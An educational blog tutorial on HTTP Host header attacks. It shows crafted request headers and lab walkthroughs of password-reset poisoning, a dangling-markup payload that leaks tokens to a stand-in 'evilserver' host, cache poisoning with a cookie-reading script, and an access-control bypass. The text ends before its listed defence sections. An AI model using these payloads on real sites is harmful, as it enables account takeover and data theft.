<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>HTTP Host Header Attack - Study Notes - SoByte</title>
  <meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">


<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6356451834813761" crossorigin="anonymous"></script>


<script async src="https://www.googletagmanager.com/gtag/js?id=G-E8GRRGBTEZ"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-E8GRRGBTEZ');
</script>


<meta name="author" content="" /><meta name="description" content="1. HTTP Host header attacks Starting with HTTP / 1.1, the HTTP Host header is a required request header. It specifies the domain name that the client wants to access. For example, when a user accesses https://example.net/web-security, their browser will compose a request containing the Host header, as follows. 1 2 GET /web-security HTTP/1.1 Host: example.net In some cases, such as when a request is forwarded by a proxy, the" /><meta name="keywords" content="Http, Host Header, Attack" />






<meta name="generator" content="Hugo 0.92.2 with theme even" />


<link rel="canonical" href="https://www.sobyte.net/post/2022-03/http-host-header-attack/" />
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/manifest.json">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">



<link href="/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">


<meta property="og:title" content="HTTP Host Header Attack - Study Notes" />
<meta property="og:description" content="1. HTTP Host header attacks Starting with HTTP / 1.1, the HTTP Host header is a required request header. It specifies the domain name that the client wants to access. For example, when a user accesses https://example.net/web-security, their browser will compose a request containing the Host header, as follows. 1 2 GET /web-security HTTP/1.1 Host: example.net In some cases, such as when a request is forwarded by a proxy, the" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://www.sobyte.net/post/2022-03/http-host-header-attack/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2022-03-02T17:03:37+08:00" />
<meta property="article:modified_time" content="2022-03-02T17:03:37+08:00" />

<meta itemprop="name" content="HTTP Host Header Attack - Study Notes">
<meta itemprop="description" content="1. HTTP Host header attacks Starting with HTTP / 1.1, the HTTP Host header is a required request header. It specifies the domain name that the client wants to access. For example, when a user accesses https://example.net/web-security, their browser will compose a request containing the Host header, as follows. 1 2 GET /web-security HTTP/1.1 Host: example.net In some cases, such as when a request is forwarded by a proxy, the"><meta itemprop="datePublished" content="2022-03-02T17:03:37+08:00" />
<meta itemprop="dateModified" content="2022-03-02T17:03:37+08:00" />
<meta itemprop="wordCount" content="3547">
<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="HTTP Host Header Attack - Study Notes"/>
<meta name="twitter:description" content="1. HTTP Host header attacks Starting with HTTP / 1.1, the HTTP Host header is a required request header. It specifies the domain name that the client wants to access. For example, when a user accesses https://example.net/web-security, their browser will compose a request containing the Host header, as follows. 1 2 GET /web-security HTTP/1.1 Host: example.net In some cases, such as when a request is forwarded by a proxy, the"/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->

</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo">SoByte</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <a href="/">
        <li class="mobile-menu-item">Home</li>
      </a><a href="/post/">
        <li class="mobile-menu-item">Archives</li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">Tags</li>
      </a><a href="/categories/">
        <li class="mobile-menu-item">Categories</li>
      </a><a href="/about/">
        <li class="mobile-menu-item">About</li>
      </a><a href="/ukraine/">
        <li class="mobile-menu-item">UKRAINE</li>
      </a>
  </ul>

  


</nav>

  <div class="container" id="mobile-panel">
    <header id="header" class="header">
        <div class="logo-wrapper">
  <a href="/" class="logo">SoByte</a>
</div>





<nav class="site-navbar">
  <ul id="menu" class="menu">
    <li class="menu-item">
        <a class="menu-item-link" href="/">Home</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/post/">Archives</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/tags/">Tags</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/categories/">Categories</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/about/">About</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/ukraine/">UKRAINE</a>
      </li>
  </ul>
</nav>

    </header>

    <main id="main" class="main">
      <div class="content-wrapper">
        <div id="content" class="content">
          <article class="post">
    
    <header class="post-header">
      <h1 class="post-title">HTTP Host Header Attack - Study Notes</h1>

      <div class="post-meta">
        <span class="post-time"> 2022-03-02 17:03:37 </span>
        <div class="post-category">
            <a href="/categories/tutorials/"> tutorials </a>
            </div>
          <span class="more-meta"> 3547 words </span>
          <span class="more-meta"> 8 mins read </span>
        
      </div>
    </header>

    <div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">Contents</h2>
  <div class="post-toc-content">
    <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#1-http-host-header-attacks">1. HTTP Host header attacks</a></li>
        <li><a href="#2-the-role-of-the-http-host-header">2. The role of the HTTP Host header</a></li>
        <li><a href="#3-what-is-http-host-header-attack">3. What is HTTP Host header attack</a></li>
        <li><a href="#4-how-to-uncover-http-host-header-attacks">4. How to uncover HTTP Host header attacks</a>
          <ul>
            <li><a href="#modify-host-value">Modify Host value</a></li>
            <li><a href="#adding-duplicate-host-headers">Adding Duplicate Host Headers</a></li>
            <li><a href="#urls-using-absolute-paths">URLs using absolute paths</a></li>
            <li><a href="#add-indent-or-newline">Add indent or newline</a></li>
            <li><a href="#inject-fields-that-override-the-host-header">Inject fields that override the Host header</a></li>
            <li><a href="#ignore-port-only-verify-domain-name">Ignore port only verify domain name</a></li>
          </ul>
        </li>
        <li><a href="#5-http-host-header-attack-vulnerability-example">5. HTTP Host header attack vulnerability example</a>
          <ul>
            <li><a href="#51-password-reset-poisoning">5.1 Password reset poisoning</a></li>
            <li><a href="#52-host-header-attack--cache-poisoning">5.2 Host header attack + cache poisoning</a></li>
            <li><a href="#53-host-header-attack-to-bypass-access-control">5.3 Host header attack to bypass access control</a></li>
            <li><a href="#54-host-header-attack--ssrf">5.4 Host header attack + SSRF</a></li>
          </ul>
        </li>
        <li><a href="#6-http-host-header-attack-protection">6 HTTP Host header attack protection</a>
          <ul>
            <li><a href="#61-properly-configuring-absolute-domain-urls">6.1 Properly configuring absolute domain URLs</a></li>
            <li><a href="#62-whitelist-checksum-host-header-for-domains">6.2 Whitelist checksum Host header for domains</a></li>
            <li><a href="#63-host-header-override-is-not-supported">6.3 Host header override is not supported</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</div>
    <div class="post-content">
      <h2 id="1-http-host-header-attacks">1. HTTP Host header attacks</h2>
<p>Starting with HTTP / 1.1, the HTTP Host header is a required request header. It specifies the domain name that the client wants to access. For example, when a user accesses <code>https://example.net/web-security</code>, their browser will compose a request containing the Host header, as follows.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">GET /web-security HTTP/1.1
Host: example.net
</code></pre></td></tr></table>
</div>
</div><p>In some cases, such as when a request is forwarded by a proxy, the Host value may be changed before it reaches the intended back-end component. A Host header attack also occurs.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/d1748009830d49f0b75ed162a519d091.png" alt="HTTP Host header attacks"></p>
<h2 id="2-the-role-of-the-http-host-header">2. The role of the HTTP Host header</h2>
<p>The purpose of the HTTP Host header is to help identify the back-end component with which the client is to communicate. If the request does not contain a Host header or is incorrectly formatted, it can cause problems when it is passed into the requested application.</p>
<p>Historically, this vulnerability was not much of a problem because each IP address would only be used for the contents of a single domain. Today, due in large part to the presence of multiple web applications on the same IP (different ports, different domain resolutions, etc.), it is often possible to access multiple websites and applications from the same IP address. The popularity of this approach is also due in part to IPv4 address exhaustion.</p>
<p>When multiple applications can be accessed from the same IP address, the most common reason is one of the following.</p>
<ul>
<li>
<p>Virtual hosting</p>
<p>A single web server hosting multiple websites or applications. This could be multiple websites with a single owner, but it could also be websites with different owners hosted on the same shared platform. They all share a common IP address with the server.</p>
</li>
<li>
<p>Routing traffic through a proxy</p>
<p>Websites are hosted on different back-end servers, but all traffic between the client and the server is routed through a proxy system. This could be a simple load balancing device or some kind of reverse proxy server. This setup is especially common in cases where clients access the site through a content delivery network (CDN).</p>
</li>
</ul>
<p>In both of the above cases, even though the sites are hosted on separate back-end servers, all of their domain names resolve to a single IP address of an intermediate component. This presents the same problem as web hosting, since reverse proxying or load balancing requires knowing which backend each request goes to.</p>
<p>The HTTP Host header does just that, specifying that the request should be sent to that application&rsquo;s backend server. Let&rsquo;s say a letter needs to be delivered to someone living in an apartment building, and there are many rooms throughout the apartment, each of which can receive mail, by specifying the room number and the recipient (aka HTTP Host header) to deliver the envelope to the specified person.</p>
<h2 id="3-what-is-http-host-header-attack">3. What is HTTP Host header attack</h2>
<p>Some websites handle the value of the Host header in an insecure manner. If the server trusts the Host header directly, without verifying its legitimacy, an attacker may be able to use this controlled variable to inject the Host in order to manipulate server-side behavior.</p>
<p>Off-the-shelf Web applications usually do not know which domain to deploy them on unless that domain is manually specified in the configuration file during installation. For example, when they need to know the current domain in order to generate the absolute URL contained in an email, they may rely on the value in the Host header.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;https://_SERVER[&#39;HOST&#39;]/support&#34;</span><span class="p">&gt;</span>联系支持<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>Host header values can also be used for various interactions between different web systems.</p>
<p>Since the Host header is actually user-controllable, this practice can lead to many problems. If left unchecked or used directly, the Host header can be used in combination with a series of other exploits, such as</p>
<ul>
<li>Cache poisoning</li>
<li>Logic vulnerabilities in special business functions</li>
<li>Route-based SSRF</li>
<li>Classic server-side vulnerabilities, such as SQL injection (when the Host is used for SQL statements), etc.</li>
</ul>
<h2 id="4-how-to-uncover-http-host-header-attacks">4. How to uncover HTTP Host header attacks</h2>
<p>The first step is to determine whether the server-side detects Host headers? After the detection is still using the value of the Host header?</p>
<p>By modifying the value of the Host, if the server side returns an error message.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/5dd64673649a4c41acbe968e170a010b.png" alt="HTTP Host header attacks"></p>
<p>Then the server side detects the content of the Host. As to whether the value of the Host header is used or not, there are several ways to discover it.</p>
<h3 id="modify-host-value">Modify Host value</h3>
<p>Simply put, the Host value in the HTTP header can be modified, and if the response packet is observed to contain the modified value, it indicates a vulnerability.</p>
<p>However, sometimes tampering with the value of the Host header can prevent access to the web application, resulting in an &ldquo;invalid host header&rdquo; error message, especially if the target is accessed through a CDN.</p>
<h3 id="adding-duplicate-host-headers">Adding Duplicate Host Headers</h3>
<p>Adding a duplicate Host header, usually one of the two Host headers is valid, which can be interpreted as one to ensure that the request is correctly sent to the target server and the other to pass the payload to the backend server.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">GET /example HTTP/1.1
Host: vulnerable-website.com
Host: attackd-stuff
</code></pre></td></tr></table>
</div>
</div><h3 id="urls-using-absolute-paths">URLs using absolute paths</h3>
<p>Although many requests typically use relative paths on the request domain, requests with absolute URLs are also configured at the same time.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">GET https://vulnerable-website.com/ HTTP/1.1
Host: attack-stuff
</code></pre></td></tr></table>
</div>
</div><p>Sometimes it is also possible to try different protocols, such as HTTP or HTTPS.</p>
<h3 id="add-indent-or-newline">Add indent or newline</h3>
<p>When some sites block requests with multiple Host headers, they can be bypassed by adding indented characters to the HTTP header.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">GET /example HTTP/1.1
 Host: attack-stuff
Host: vulnerable-website.com
</code></pre></td></tr></table>
</div>
</div><h3 id="inject-fields-that-override-the-host-header">Inject fields that override the Host header</h3>
<p>Fields with similar functionality to the Host header, such as X-Forwarded-Host, X-Forwarded-For, etc., which are sometimes turned on by default.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">GET /example HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: attack-stuff
</code></pre></td></tr></table>
</div>
</div><p>Blah, blah, blah, and other fields.</p>
<ul>
<li>X-Host</li>
<li>X-Forwarded-Server</li>
<li>X-HTTP-Host-Override</li>
<li>Forwarded</li>
</ul>
<h3 id="ignore-port-only-verify-domain-name">Ignore port only verify domain name</h3>
<p>When modifying, adding duplicate Host headers is blocked, try to understand how the web application parses the Host header.</p>
<p>For example, some parsing algorithms will ignore the port value in the Host header and only verify the domain name. At this point, the Host can be modified to the following form.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">GET /example HTTP/1.1
Host: vulnerable-website.com:attack-stuff
</code></pre></td></tr></table>
</div>
</div><p>Keep the domain name unchanged, modify the port value to a value other than the port number (non-numeric), place the payload of the Host header attack at the port value, the same Host header attack can be carried out.</p>
<h2 id="5-http-host-header-attack-vulnerability-example">5. HTTP Host header attack vulnerability example</h2>
<h3 id="51-password-reset-poisoning">5.1 Password reset poisoning</h3>
<p>According to the attack characteristics of the HTTP Host header attack, it is widely used in password reset poisoning: an attacker can manipulate the password reset link generated by a website in the case of a password reset, so that it is sent under the domain specified by the attacker, and use this to steal the token to reset the password of any user.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/13911eb32e254033b0eb5d8f4dbe362a.png" alt="HTTP Host header attack vulnerability"></p>
<p>The general flow of a password reset (forgotten password) function is as follows.</p>
<ol>
<li>
<p>The user enters their username or email address and then submits a password reset request.</p>
</li>
<li>
<p>The site checks to see if the user exists and then generates a temporary, unique, complex token that is associated with the back-end user account.</p>
</li>
<li>
<p>The site sends an email to the user with a link to reset their password. The parameters for resetting the token are included in the corresponding URL.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">https://normal-website.com/reset?token=0a1b2c3d4e5f6g7h8i9j
</code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>When the user visits this URL, the site will check if the token provided is valid and use it to determine which account to reset. If everything matches, the user can proceed to the user reset password step. Finally, the token is destroyed.</p>
</li>
</ol>
<p>The security of the above step relies on the fact that only the target user has access to their email and thus to their unique token.</p>
<p>Password reset poisoning is a vulnerability that steals this token in order to change another user&rsquo;s password.</p>
<p>This can lead to password reset poisoning if a website&rsquo;s password reset process relies entirely on controlled user input (e.g. HTTP Host header).</p>
<ol>
<li>
<p>the attacker obtains the victim&rsquo;s username or email as a request to submit a password reset, the attacker intercepts the request and modifies the HTTP Host header for the domain it specifies, such as <code>evil-user.net</code></p>
</li>
<li>
<p>the victim will receive an email to reset the password, but because the attacker modified the Host header, and the web application generates the reset link is completely dependent on the Host header, resulting in the following URL.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">https://evil-user.net/reset?token=0a1b2c3d4e5f6g7h8i9j
</code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>if the victim clicks on the link, the password reset token will be sent to the attacker&rsquo;s server evil-user.net</p>
</li>
<li>
<p>When the attacker gets the token of the worm password, it will be constructed accordingly to visit the real reset password URL to reset the password.</p>
</li>
</ol>
<h4 id="511-password-reset-poisoning---basics">5.1.1 Password Reset Poisoning - Basics</h4>
<p>After understanding the process and principle of password reset poisoning above in detail, the basic password reset poisoning caused by HTTP Host header attack is demonstrated here.</p>
<p>First, enter the user name or the user&rsquo;s email address to reset the password of the specified user.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/b0ebfdcfe23849ea8b2cf2cf834a7907.png" alt="Password Reset Poisoning"></p>
<p>After submission, a password reset email will be sent to the wiener user&rsquo;s email address (the packet is shown below).</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/5bf8db051f4746268b028d427f1dd322.png" alt="data packet"></p>
<p>Note the link to reset password, may be affected by the value of the Host header?</p>
<p>Let&rsquo;s verify if there is an HTTP Host header attack by modifying the value of the Host header to <code>baidu.com</code>.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/4240876d76904cbcb7b10d7dd866a70a.png" alt="modifying the value of the Host header"></p>
<p>The request was found to be receivable by the back-end server, so there is an HTTP Host header attack.</p>
<p>Here we enter the victim user carlos to reset the password, and then grab the packet to change the value of the Host header to our own server.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/cc3bb27deb8e447293d61251d6e78ae2.png" alt="sobyte"></p>
<p>The stolen Reset Password Token can then be seen on our own server through the access logs.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/f9aab4fe4fa147728cea7efc127b636b.png" alt="stolen Reset Password Token"></p>
<p>The link to reset the password is then constructed according to the known link pattern.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">https://ac651f551e5317b8800207bd008f000f.web-security-academy.net/forgot-password?temp-forgot-password-token=00YIexUDyNLEJkaBXDoCILWtZAGaxgi7
</code></pre></td></tr></table>
</div>
</div><p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/cb6b1ce4556f4ff5963e298d9feae324.png" alt="sobyte"></p>
<p>Then enter the interface to enter a new password, and the password reset poisoning is successful.</p>
<h4 id="512-password-reset-poisoning---injecting-fields-that-overwrite-the-host-header">5.1.2 Password reset poisoning - injecting fields that overwrite the Host header</h4>
<p>Sometimes direct modification of the Host header, adding duplicate Host header values and obfuscating the Host header do not work.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/38961048557448e0ae9f74d49f2f9ab3.png" alt="sobyte"></p>
<p>You can try to use HTTP fields with the same function as the Host header, such as X-Forwarded-Host, X-Forwarded-For, etc., which can be Fuzzed.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/d6616f9d2e2f4bceaf15c396e5e14177.png" alt="sobyte"></p>
<p>In fact he was able to be affected by the X-Forwarded-Host field, resulting in a Host header attack, when adding multiple fields at the same time so that the request is blocked, you can try similar exclusion methods, dichotomous methods to rank which field is effective.</p>
<p>Poisoning the victim user carlos with a password reset.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/af0b684ff4db4fc8bfe74c18b89ba083.png" alt="sobyte"></p>
<p>Then just construct the link.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">https://acf11f4e1f164378800b165b00bb007d.web-security-academy.net/forgot-password?temp-forgot-password-token=o8gD3Le1K0YQcb2AaASgiI8F2eVI5m3h
</code></pre></td></tr></table>
</div>
</div><p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/e4582505b3464332a91ce9285fc8bd6b.png" alt="sobyte"></p>
<h4 id="513-reset-password-poisoning---dangling-markup-technique">5.1.3 Reset Password Poisoning - Dangling Markup Technique</h4>
<p>First, a brief introduction to the Dangling Markup technique.</p>
<ul>
<li>Dangling markup technology</li>
</ul>
<p>Dangling markup technique, is a technique to steal page content without scripting, it uses resources such as images (combined with policies run by CSPs) to send data to a remote location controlled by the attacker. It is very useful when reflective XSS does not work or is blocked by a content security policy (CSP). The idea is to insert some partial HTML in an unfinished state, such as the src attribute of an image tag, and the rest of the tags on the page turn off that attribute, but at the same time send the data between the two (containing the content of the stolen page) to a remote server.</p>
<p>For example, we inject such an img tag at a reflective XSS injection point.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://evilserver/?</span>
</code></pre></td></tr></table>
</div>
</div><p>Then the injection point and the next double-quoted code will be sent to the attacker&rsquo;s <code>https://evilserver](https://evilserver/</code> server, where the sent code or content may contain some sensitive information, such as CSRF Token, with reflective XSS to complete the CSRF exploitation.</p>
<p>When can I use Dangling Markup technology? What does it have to do with the topic of this article?</p>
<p>Let&rsquo;s go straight to the topic, after entering the user name that needs to reset the password, the user will receive the following email in their email.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/a0761bfefa9449c7a050a4454c62c760.png" alt="sobyte"></p>
<p>There is a link that jumps to the login screen, followed by a random password after a reset.</p>
<p>At this point, consider whether the link is taking a value from the Host header. As long as this value is controllable, then a Dangling Markup attack can be performed using a Host header attack, containing the password immediately after the link, and then combining it with a Host header attack to assign the request to the attacker&rsquo;s server. A roaming theft is completed.</p>
<ul>
<li>
<p>The first step is to find the Host header attack point.</p>
<p>Through Fuzz, it can be found that the Host header attack type is Ignore port only verify domain name. That is, when the server verifies the Host domain, only the domain name is verified, ignoring the port number behind, resulting in a controllable port value (can be a number or character).</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/40ef810a366440869de8b82031c34a83.png" alt="sobyte"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/92601e3a9db14938ba07992f8601a540.png" alt="sobyte"></p>
<p>By injecting payload in the port of the Host header, the Host header attack can still be implemented.</p>
</li>
<li>
<p>In the second step, the Dangling Markup technique is implemented with the help of the controllable variable Host:ip:port, thus bringing the back password out to the attacker&rsquo;s server.</p>
<p>Note that you need to close the double quotes out here, after trying, when you enter single quotes, the server will automatically turn to double quotes, so here the double quotes will be closed by single quotes, and then add a custom <code>&lt;a href=xxx.attack-domain&gt;</code>  tag to take the password outside.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/06149c5cbb9947a9866cb419271cdb29.png" alt="sobyte"></p>
</li>
</ul>
<p>The original normal HTML would have looked like this.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/21f4cd7e0a9b4d58bda96ef79916ea52.png" alt="sobyte"></p>
<p>By using the Dangling Markup technique, the link in the a tag is injected with the ? character, so that all subsequent values are requested as URL parameters to the attacker&rsquo;s server before the double quotes are closed.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/3867b726a46843e6868a594d776b942f.png" alt="sobyte"></p>
<p>This is the essence of the Dangling Markup technique, the core point of which is.</p>
<blockquote>
<p>whether the key data to be stolen (including Token, password, etc.) is followed by a controlled variable</p>
</blockquote>
<p>The attacker&rsquo;s server can see the request forwarded up by the Host header attack, which successfully stole the victim&rsquo;s reset password.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/c6e685d6c4094f9281a96f1f90f96e56.png" alt="sobyte"></p>
<h3 id="52-host-header-attack--cache-poisoning">5.2 Host header attack + cache poisoning</h3>
<p>When the web site where the Host header attack exists does not have a password reset feature, the vulnerability appears to have no impact at this point because it is impossible to drive users to grab packets to modify the Host header and assist the attacker in completing a series of attacks.</p>
<p>However, if the target site uses the Web cache, it can be poisoned through the cache to provide other users with a virus cache response. At this point the Host header attack vulnerability is transformed into a similar XSS storage type of vulnerability. To construct a Web cache poisoning attack.</p>
<ol>
<li>one needs to find the cache key that maps to another user&rsquo;s request.</li>
<li>the next step is to cache this malicious response.</li>
<li>this malicious cache will then be served to all users who try to access the affected page.</li>
</ol>
<ul>
<li>
<p>The first step is to find the Host header attack point.</p>
<p>By adding duplicate Host values to the site&rsquo;s home page, an override can be achieved and the presence of a Host header attack can be verified.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/c0c16713aa9a4c428e09b170a85cc2ac.png" alt="sobyte"></p>
</li>
<li>
<p>In the second step, find out if web caching is used? What is the cache key?</p>
<p>As you can also see from the image above, the site uses the Wen caching feature and with the Host header attack, it can cache the <strong>/resources/js/tracking.js</strong> resource file.</p>
</li>
<li>
<p>In the third step, a <strong>/resources/js/tracking.js</strong> resource file with the same name is created on the attacker&rsquo;s server with the following content.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">alert(document.cookie);
</code></pre></td></tr></table>
</div>
</div></li>
</ul>
<p>The attacker&rsquo;s server domain name is then injected through the Host header, which can be seen to correctly correspond to our <strong>/resources/js/tracking.js</strong> resource file in the response.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/614ebc4cae004d3a81dfe2c7e71647f5.png" alt="sobyte"></p>
<p>Send multiple requests so that the response to that request becomes cached.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/1a65b75dad5b450e89a3d024f5a94099.png" alt="sobyte"></p>
<p>When other users request the site&rsquo;s homepage, the server will provide that malicious cache to the user, causing cache poisoning.</p>
<h3 id="53-host-header-attack-to-bypass-access-control">5.3 Host header attack to bypass access control</h3>
<p>For security reasons, access to certain features of a website is usually restricted to internal users. However, it is possible to bypass these restrictions through Host header attacks.</p>
<p>For a site, from the discovery of a Host header attack to its exploitation, the following is a complete process.</p>
<ul>
<li>
<p>The first step is to visit the home page and change the value of Host at will.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/33ab53df49d3443a8698e82abd321747.png" alt="sobyte"></p>
<p>Note that the value of Host here will not appear in the response packet, but there may still be a Host header attack, because the response is still successful, indicating that the server did not do verification of the Host header.</p>
</li>
<li>
<p>The second step is to look for sensitive pages and know that /admin is an access-controlled page through /robots.txt.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/73782c0995744088bbf37f5c9fb64976.png" alt="sobyte"></p>
</li>
</ul>
<p>The error message can indicate that the /admin page is only accessible to local users.</p>
<ul>
<li>
<p>In the third step, change the Host to the internal address of the server, thus bypassing IP access control.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/729b56bc31b943a2ad1e9cb735df7a50.png" alt="sobyte"></p>
</li>
</ul>
